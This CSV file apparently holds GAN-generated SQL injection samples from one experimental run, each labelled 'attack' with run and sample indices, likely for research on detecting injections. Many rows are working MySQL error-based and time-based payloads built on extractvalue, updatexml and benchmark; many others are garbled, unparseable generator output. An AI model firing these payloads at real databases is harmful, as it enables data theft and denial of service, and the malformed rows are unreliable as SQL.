label,payload,family,payload_type,method,run_id,sample_index
attack,1% pk'  =  'ciki,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,"1%""   )    procede  (  8841  =  7636  (  9627,concat  (  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  select   (  elt  (  1297  =  (  (  (  7982  =  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  (  select   (  case when   (  (  elt  )  0x2e,0x7171706a71,  (  (  t  (  benchmark  (  (  5000000(  (  (  (  5777  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack,"""   )    )    AND AND,1  (  8860  =  2162  =  9338  (  extractvalue  (  7982,1   )    AND cast  (  9627,mduan  )  2917  =  1759(  (  benchmark  (  (  3393,1   from duanal  )  )   end  (  (  elt  (  elt  (  1297  =  (  5000000  (  =  (  (  7982  =  (  3863  (  50000000x5c,  (  (  benchmark  (  (  (  t  (  benchmark  (  (  50000003393,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,"1%""   )    us wwmxqFROMose anal  )  1297=  (  (  (  0x5c,  (  (  50000003393,concat  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md5t  (  benchmark  (  (  e  (  select   (  case when   (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  (  elt  e  (  select   (  case when   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack,"1%j'  =  '""5603'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,"1%""   )    )    AND 1559  =  * or  extractvalue  (  1297,0x7171706a71,  (  5000000,md5  (  0x2e,0x717a767a71  (  select 1272  (  (  (  (  0x5c,0x7171706a71,  (  =  (  3393,  (  (  (  benchmark  (  (  select   (  elt  (  )  0x2e,0x7171706a71,  (  (  1759(  (  1808  =  8277  =  (  (  3393,concat  (  (  (  (  1 as adn  (  case when   (  (  (  l  )  1 when   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kh8318"" like "") ' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'tne  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  benchmark  (  (  1297,concat  (  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark*(  1759  (  (  (  0x4b774c75   (  2914  =  (  (  3393,1   )    )     (  extractvalue  (  1808,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  select   (  el  e  (  select   (  elt0 a  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,"1%""   )    AND 'i'  =  1   (  )  )  select 2518  (  (  (  (  (  1808,concat  (  (  3393,1   (  (  case when  (  1759  (  select   (  (  4415  =  ut  elt  )  0x5c,  (  (  (  select   (  eltl  (  0x4b774c75   end  (  (  case 0 0 from dua  elt 0   (  2917,0x7171706a71)  (  e  (  (  elt  (  2917    =  1   )    (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,"1"" and extractvalue  (  (  3393,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1759  =  (  1 a  )    8083  =  utl  (  case  )  select 0 from   (  (  ellt  (  elt  (  3393  =  (  1 or   (  )  (  (  (  elt  (  5000000,md5  (  (  0x4b774c75   end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,"1and updatexml  (  (  (  ' like 'dualyse analyse  (  5198  =  3393,  (  select   (  eld a  (  0x5c,0x7171706a71,  (  select   (  1049  =  (  (  0x5c,0x7171706a71,  (  (  t  (  select   (  elt  (  elt  (  5000000,m(  (  (  select   (  )   (  3539  (   from dua  (  elta  elt   (  6166  =  (  (  (  1808  =  8768  (  5000000,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,"1%""   )    )    AND AND or  1 extractvalue  (  (  (  (  (   (  4660  (  (  (  (  0x5c,0x7171706a71,  (  0x5c,0x7171706a71,  (  (  0x5c,  (  (  (  =  (  (  5000000,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  (  (  (  (  benchmark  (  benchmark  (  (  (  benchmark  (  benchmark  (  2917,concat  (  =  (  0x2e,0x7171706a71,concat  (  (  (  (  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack,"1"" or updatexml  (  (  (  (  (  (  (  0x2e,concat  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  8862t=  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3393  =  (  5464  =  (  (  (  3393,1   from dual  )  e  )  7982  =  (  50000000x5c,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""y"" like ""gge' like 'n mnAmTvpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack,"1%""  )   and extractvalue  (  (  (  5000000(  (  0x5c,0x7171706a715433  (  benchmark  (  (  1297,concat  (    (  (  0x2e,0x7171706a71(  (  =  (  (   (  )   (  (  elt  (  (  e  0x52515a50   end  (  1354  (  (  (  5000000,md5  (  select   (  elt  (  e  (  1297  =  (  3393,1   from d a from(   (  6804  (  (  5423  =  8862,md5  (  (  (  0x4b774c75   end  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,"1%""   and updatexml  (  (  3393,concat  (  0x2e,0x7171706a71,  (  (  (  (  (  benchmark  (  5000000(  (  0x2e,concat  (  (  1759(  0x2e,0x7171706a71,  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3576  =  (  1297,1   from dual  )   SELECT proceduedure analnall  e  )   SELECT drooileanalyseduree  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack,"1%""   )    (  *  =  't  (  case or updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71  (  (  (   (  select   (  (  elt  (  0x2e,(  (  (  0x52515a50   end  (  elt  (  3393,1   from dua  elt  (  elt  (  elt  (  0x2e,,md5  (  0x5c=  (  (  (  3393  =  (  (  0x2e,concat  (  (  (  select   (  e  (  e  5198  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,"1 and updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  9255,concat  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  9627,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  5000000,updatexml  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt   (  elt  (  1808  =  (  (  (  3393  =  (  7744  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack,"1%"" 1354 extractvalue  (   (  (   (  3576  (  (  (  (  2917  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  (  benchmark  (  (  ((  elt  (  benchmark  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x2e,m5  (  (  0x5c,  (  (  5000000,md5  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  elte  8375  =  (  1808,concat  (  0x5c,0x7171706a71,  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbse du      l  (  0x5c,md5  (  (  0x5c,md5  (  (  0x4b774c75   end  (   (   (a  (  ell  (  9788  =  (  3393,md5  (  (  3393,1   (  case 0 from dual  el  )  )   end  (  (  elt  (  3393,  (  (  select   (  elt   (  (  elt  (  select   (  1724  (  1759,  (  (  0x2e,md5  (  1   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "" where an dut  elt  (  7982  =  (  select   (  el  (  2917  =  (  2917,concat  (  5322t  (  (  0x5c,0x7171706a71,  (  select   (  1808)   SELECT or from 0 from d5  (  lt  e  (  elt  (  e  (  3393  =  1808,1   (  select   (  5198  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  1808,m,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,"1%"" updatexml  (   SELECT 1559 (  (  1808  =  (  (  0x2e,0x7171706a71,  )  (  benchmark  (  t  (  (   (  4415  (  (  (  select   (  elt  (  eltt  1808  )  select   (  elt  case when   (  extractvalue  (  5000000,md5  (  (  0x2e,  (  select   (  case 0 0 from dual  )   end  (  (  case 0 0 from dual  )  e  )  5603   (  (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,"1%""   )    AND 7997 extractvalue  (   (  (  (  elt  (  elt  (  0x2e,md5  (  0x2e,m(  (  (  =  (  (  9627,concatt  (  (  (  (  0x2e,0x717a767a71  (  select   (  (  elt  (  case  )  7982  =  (  0x2e,md5  (  benchmark  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  1808  =  =  (  (  3393,  (  (  0x2e,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  ""u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,"1%""   )    )    (  9338select   (  updatexml  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  (  (  (  (  (  (  (  0x5c,(  (  (  (  (  5000000,0x7171706a71(  (  (  benchmark  (  3393,concat  (  0x5c0x7171706a71,0x7171706a71,0x7171706a71(  (  (  0x5c,0x7171706a71,concat  (  (  (  (  (  (  select   (  e  )  5198  =  (  (  e  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%Ybn"" 3863 ancase 2914 5603   (  4415  (  (  1808,concat  (  (  (  0x2e,1   or extractvalue  (  (  (  (  0x5c,0x7171706a71,  (  select   (  e)  ual  )  )  )  )  =  1297,1   )    5  (  select   (  =  utl  )  1808,1   from d     (  elt  (  9788  =  3335  (  8862,1   )    AND 8083  =  1 0 d5 as annal  )   end  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,"1%1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,"1%""   )    )    FROMs 8860  =  (  9083  )  select 0 from dual  4688  )    =  (  7982  =  (  (  0x2e,(  (  (  0x2e,0x7171706a71,  (  select   (  case 0 0 from dua   (  3863  (  elt  )  elt  (  elt  (  eyta  )  ua  (  case when   (   (  (  1354  =  (  7982,1   )    (  extractvalue  (  (  3393,concat  (  =  (  1759(  5433",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack,"1%p' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'i",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,"1%""   )    1559  (  select   (  6166  (  extractvalue  (  1 9103  (  (  (  (  (  (  et  (  e  (  0x4b774c75   7636  (  elt  (  1297  =  (  (  7982     (  2813  (  (  e  (  1808  =  (  select   (  5000000,0x7171706a71(  (  (  (  benchmark  ,  (  benchmark  (  5000000(  (  (  t  (  0x5c,0x7171706a71,  (  =  (  2917,concat  (  (  (  (  select   (  3393,1   )    (    (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
attack,"1%""   )    )b  (  (  0x5c,(  (  =  2917,,1   (  case or updatexml  (  (  (  (  (  (  (  (  (  =  (  (  e  (  0x5c,  (  (  select   (  elt5704  =  9350  =  (  3393,1   from from dua  )  elt  (  elt  (  e  (  0x2e,  (  (  select   (  el  (  0x5c,  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  5000000(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '% ANDin%'  =  'q"" like ""kkprocincedure analyse  (  5847  (  5847  =  (  1808,concat  (  (  3393,concat  (  (  (  0x2e,md5  (  (  (  0x5c,  (  select   (  elt  (  0x2e,0x7171706a71,  (  --,  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  2917,concat  (  (  (  0x2e,mdu_namonadds   (    (    e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1795
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1796
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%5""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1797
attack,"1%""   )    )    FROM us   (  elt  (  elt  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e  (  1759  =  (  (  3393,1   (  4968 when   (  6166  (  (  (  1808  =  (  (  e  (  (  0x2e,md5  (  (  0x2e,md5  (  select   (  elt  (  2917  (  8421  (  e  (  1808,concat  (  (  (  (  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1798
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  'then%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1799
attack,"1%%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1800
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhnehgesmx",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1801
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""% procen FROM mnn(  e  (  0x2e,0x7171706a71,  (  5000000  (  (  select   (  elt  (  1297  =  (  (  9788  =  (  (  (  0x2e,0x7171706a71,  (  =  (  (  9627,concat  (  (  9393  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  0x4b774c75   (  1724  (  (  3393  )  (  (  (  (  0x2e,md5  (  1808,md5  (  3393  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1802
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1803
